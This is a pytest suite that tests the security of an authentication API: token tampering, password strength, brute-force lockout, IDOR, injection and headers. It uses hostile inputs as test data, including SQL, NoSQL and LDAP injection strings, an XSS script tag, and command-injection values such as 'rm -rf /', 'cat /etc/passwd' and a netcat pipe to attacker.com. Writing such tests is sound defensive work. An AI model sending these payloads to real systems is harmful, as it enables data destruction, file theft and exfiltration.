"""Comprehensive security tests for authentication system."""

import pytest
from datetime import datetime, timedelta
from unittest.mock import patch, MagicMock
import secrets
import jwt

from fastapi.testclient import TestClient
from sqlalchemy.ext.asyncio import AsyncSession

from src.models.user import User, UserStatus
from src.models.session import UserSession
from src.models.rbac import Role, Permission
from src.security.tokens import TokenService, TokenType
from src.security.passwords import PasswordService


class TestJWTSecurity:
    """Test JWT token security."""
    
    @pytest.fixture
    def token_service(self):
        return TokenService()
    
    def test_token_expiration(self, token_service):
        """Test that tokens expire properly."""
        # Create token with 1 second expiration
        token = token_service.create_token(
            {"sub": "user123"},
            TokenType.ACCESS,
            expires_delta=timedelta(seconds=1)
        )
        
        # Token should be valid immediately
        data = token_service.decode_token(token)
        assert data.sub == "user123"
        
        # Wait for expiration
        import time
        time.sleep(2)
        
        # Token should be expired
        with pytest.raises(ValueError, match="expired"):
            token_service.decode_token(token)
    
    def test_token_tampering(self, token_service):
        """Test that tampered tokens are rejected."""
        token = token_service.create_access_token("user123")
        
        # Tamper with token
        parts = token.split('.')
        tampered_token = f"{parts[0]}.tampered.{parts[2]}"
        
        with pytest.raises(ValueError):
            token_service.decode_token(tampered_token)
    
    def test_token_signature_validation(self, token_service):
        """Test token signature validation."""
        # Create token with different secret
        fake_token = jwt.encode(
            {"sub": "user123", "type": "access"},
            "wrong_secret",
            algorithm="HS256"
        )
        
        with pytest.raises(ValueError):
            token_service.decode_token(fake_token)
    
    def test_token_type_validation(self, token_service):
        """Test that token types are validated."""
        access_token = token_service.create_access_token("user123")
        refresh_token = token_service.create_refresh_token("user123")
        
        # Should work with correct type
        token_service.verify_token(access_token, TokenType.ACCESS)
        token_service.verify_token(refresh_token, TokenType.REFRESH)
        
        # Should fail with wrong type
        with pytest.raises(ValueError, match="Invalid token type"):
            token_service.verify_token(access_token, TokenType.REFRESH)
        
        with pytest.raises(ValueError, match="Invalid token type"):
            token_service.verify_token(refresh_token, TokenType.ACCESS)


class TestPasswordSecurity:
    """Test password security features."""
    
    @pytest.fixture
    def password_service(self):
        return PasswordService()
    
    def test_password_hashing(self, password_service):
        """Test password hashing is secure."""
        password = "SecurePass123!"
        
        # Hash password
        hash1 = password_service.hash_password(password)
        hash2 = password_service.hash_password(password)
        
        # Same password should produce different hashes (due to salt)
        assert hash1 != hash2
        
        # Both should verify correctly
        assert password_service.verify_password(password, hash1)
        assert password_service.verify_password(password, hash2)
    
    def test_password_strength_validation(self, password_service):
        """Test password strength requirements."""
        # Weak passwords should fail
        weak_passwords = [
            "short",  # Too short
            "alllowercase",  # No uppercase
            "ALLUPPERCASE",  # No lowercase
            "NoNumbers!",  # No digits
            "NoSpecial123",  # No special chars
            "password123!",  # Common password
        ]
        
        for weak_pass in weak_passwords:
            assert not password_service.validate_password_strength(weak_pass)
        
        # Strong password should pass
        assert password_service.validate_password_strength("Str0ng!Pass#2023")
    
    def test_password_history(self, password_service):
        """Test password history validation."""
        password = "OldPass123!"
        hashed = password_service.hash_password(password)
        history = [hashed]
        
        # Same password should be detected in history
        assert password_service.is_password_in_history(password, history)
        
        # Different password should not be in history
        assert not password_service.is_password_in_history("NewPass456!", history)
    
    def test_timing_attack_resistance(self, password_service):
        """Test resistance to timing attacks."""
        password = "TestPass123!"
        wrong_password = "WrongPass456!"
        hash_val = password_service.hash_password(password)
        
        # Time multiple verifications
        import time
        correct_times = []
        wrong_times = []
        
        for _ in range(10):
            # Time correct password
            start = time.time()
            password_service.verify_password(password, hash_val)
            correct_times.append(time.time() - start)
            
            # Time wrong password
            start = time.time()
            password_service.verify_password(wrong_password, hash_val)
            wrong_times.append(time.time() - start)
        
        # Average times should be similar (constant time comparison)
        avg_correct = sum(correct_times) / len(correct_times)
        avg_wrong = sum(wrong_times) / len(wrong_times)
        
        # Times should be within 20% of each other
        assert abs(avg_correct - avg_wrong) / max(avg_correct, avg_wrong) < 0.2


class TestAuthenticationFlow:
    """Test authentication flow security."""
    
    @pytest.mark.asyncio
    async def test_brute_force_protection(self, test_client: TestClient, db: AsyncSession):
        """Test protection against brute force attacks."""
        # Create test user
        user = User(
            email="test@example.com",
            username="testuser",
            password_hash="dummy",
            status=UserStatus.ACTIVE
        )
        db.add(user)
        await db.commit()
        
        # Attempt multiple failed logins
        for i in range(6):
            response = test_client.post("/auth/login", data={
                "username": "test@example.com",
                "password": "wrongpassword"
            })
        
        # Account should be locked after 5 attempts
        await db.refresh(user)
        assert user.status == UserStatus.LOCKED
        assert user.failed_login_attempts >= 5
        assert user.locked_until is not None
    
    @pytest.mark.asyncio
    async def test_session_fixation_prevention(self, test_client: TestClient, db: AsyncSession):
        """Test prevention of session fixation attacks."""
        # Login
        response = test_client.post("/auth/login", data={
            "username": "test@example.com",
            "password": "correct_password"
        })
        
        token1 = response.json()["access_token"]
        
        # Login again
        response = test_client.post("/auth/login", data={
            "username": "test@example.com",
            "password": "correct_password"
        })
        
        token2 = response.json()["access_token"]
        
        # Should get different tokens
        assert token1 != token2
    
    @pytest.mark.asyncio
    async def test_concurrent_session_limit(self, test_client: TestClient, db: AsyncSession):
        """Test concurrent session limiting."""
        # Create multiple sessions for same user
        user_id = "test_user_id"
        
        for i in range(10):
            session = UserSession(
                user_id=user_id,
                session_token=f"token_{i}",
                refresh_token=f"refresh_{i}",
                expires_at=datetime.utcnow() + timedelta(days=1),
                status="active"
            )
            db.add(session)
        
        await db.commit()
        
        # Check that old sessions are invalidated
        sessions = await db.query(UserSession).filter(
            UserSession.user_id == user_id,
            UserSession.status == "active"
        ).all()
        
        # Should enforce session limit
        assert len(sessions) <= 5  # Assuming max 5 sessions


class TestAuthorizationSecurity:
    """Test authorization security."""
    
    @pytest.mark.asyncio
    async def test_privilege_escalation_prevention(self, test_client: TestClient, db: AsyncSession):
        """Test prevention of privilege escalation."""
        # Create regular user
        user = User(
            email="regular@example.com",
            username="regular",
            status=UserStatus.ACTIVE
        )
        
        # Create user role
        user_role = Role(name="user", display_name="User")
        user.roles.append(user_role)
        
        db.add(user)
        await db.commit()
        
        # Try to access admin endpoint
        headers = {"Authorization": f"Bearer {create_test_token(user.id)}"}
        response = test_client.get("/users/", headers=headers)
        
        assert response.status_code == 403
    
    @pytest.mark.asyncio
    async def test_insecure_direct_object_reference(self, test_client: TestClient, db: AsyncSession):
        """Test protection against IDOR attacks."""
        # Create two users
        user1 = User(id="user1", email="user1@example.com", username="user1")
        user2 = User(id="user2", email="user2@example.com", username="user2")
        
        db.add_all([user1, user2])
        await db.commit()
        
        # User1 tries to access User2's data
        headers = {"Authorization": f"Bearer {create_test_token('user1')}"}
        response = test_client.get("/users/user2", headers=headers)
        
        # Should be denied without proper permissions
        assert response.status_code == 403


class TestInputValidation:
    """Test input validation and injection prevention."""
    
    def test_sql_injection_prevention(self, test_client: TestClient):
        """Test SQL injection prevention."""
        # Attempt SQL injection in login
        malicious_inputs = [
            "admin' OR '1'='1",
            "admin'; DROP TABLE users; --",
            "admin' UNION SELECT * FROM users --"
        ]
        
        for payload in malicious_inputs:
            response = test_client.post("/auth/login", data={
                "username": payload,
                "password": "password"
            })
            
            # Should not cause SQL error, just auth failure
            assert response.status_code == 401
            assert "SQL" not in response.text
    
    def test_xss_prevention(self, test_client: TestClient):
        """Test XSS prevention in user inputs."""
        # Attempt XSS in user registration
        response = test_client.post("/auth/register", json={
            "email": "test@example.com",
            "username": "testuser",
            "password": "SecurePass123!",
            "full_name": "<script>alert('XSS')</script>"
        })
        
        # If successful, check that script tags are escaped
        if response.status_code == 200:
            user_data = response.json()
            assert "<script>" not in user_data.get("full_name", "")
    
    def test_command_injection_prevention(self, test_client: TestClient):
        """Test command injection prevention."""
        # Attempt command injection
        malicious_inputs = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234"
        ]
        
        for payload in malicious_inputs:
            response = test_client.post("/auth/register", json={
                "email": f"{payload}@example.com",
                "username": payload,
                "password": "SecurePass123!",
                "full_name": "Test User"
            })
            
            # Should validate input, not execute commands
            assert response.status_code in [400, 422]  # Bad request or validation error


class TestSecurityHeaders:
    """Test security headers."""
    
    def test_security_headers_present(self, test_client: TestClient):
        """Test that security headers are present."""
        response = test_client.get("/health")
        
        # Check for security headers
        assert "X-Content-Type-Options" in response.headers
        assert response.headers["X-Content-Type-Options"] == "nosniff"
        
        assert "X-Frame-Options" in response.headers
        assert response.headers["X-Frame-Options"] == "DENY"
        
        assert "X-XSS-Protection" in response.headers
        assert "Strict-Transport-Security" in response.headers
        assert "Content-Security-Policy" in response.headers
    
    def test_cors_configuration(self, test_client: TestClient):
        """Test CORS is properly configured."""
        # Test preflight request
        response = test_client.options("/auth/login", headers={
            "Origin": "http://localhost:3000",
            "Access-Control-Request-Method": "POST"
        })
        
        assert "Access-Control-Allow-Origin" in response.headers
        assert "Access-Control-Allow-Methods" in response.headers
        assert "Access-Control-Allow-Headers" in response.headers


class TestOWASPCompliance:
    """Test OWASP Top 10 compliance."""
    
    @pytest.mark.asyncio
    async def test_a01_broken_access_control(self, test_client: TestClient):
        """Test for broken access control vulnerabilities."""
        # Test unauthorized access to admin functions
        response = test_client.post("/users/user123/lock", 
                                  params={"reason": "test"})
        assert response.status_code == 401
        
        # Test with regular user token
        user_token = create_test_token("regular_user")
        response = test_client.post("/users/user123/lock",
                                  headers={"Authorization": f"Bearer {user_token}"},
                                  params={"reason": "test"})
        assert response.status_code == 403
    
    @pytest.mark.asyncio
    async def test_a02_cryptographic_failures(self, test_client: TestClient):
        """Test for cryptographic failures."""
        # Ensure sensitive data is not exposed in responses
        response = test_client.post("/auth/login", data={
            "username": "test@example.com",
            "password": "wrongpassword"
        })
        
        # Password should never be in response
        assert "wrongpassword" not in response.text
        
        # Check tokens are properly signed
        if response.status_code == 200:
            token = response.json().get("access_token")
            assert token and len(token.split('.')) == 3  # JWT format
    
    @pytest.mark.asyncio
    async def test_a03_injection(self, test_client: TestClient):
        """Test for injection vulnerabilities."""
        # NoSQL injection attempt
        response = test_client.post("/auth/login", json={
            "username": {"$ne": None},
            "password": {"$ne": None}
        })
        assert response.status_code in [400, 422]
        
        # LDAP injection attempt
        response = test_client.post("/auth/login", data={
            "username": "admin)(&(password=*))",
            "password": "anything"
        })
        assert response.status_code == 401
    
    @pytest.mark.asyncio
    async def test_a07_identification_authentication_failures(self, test_client: TestClient):
        """Test identification and authentication failures."""
        # Test account enumeration prevention
        response1 = test_client.post("/auth/login", data={
            "username": "nonexistent@example.com",
            "password": "wrongpass"
        })
        
        response2 = test_client.post("/auth/login", data={
            "username": "existing@example.com",
            "password": "wrongpass"
        })
        
        # Error messages should be identical
        assert response1.json()["detail"] == response2.json()["detail"]
        
        # Response times should be similar (timing attack prevention)
        # This would need more sophisticated testing in practice


# Helper function
def create_test_token(user_id: str) -> str:
    """Create a test JWT token."""
    token_service = TokenService()
    return token_service.create_access_token(user_id)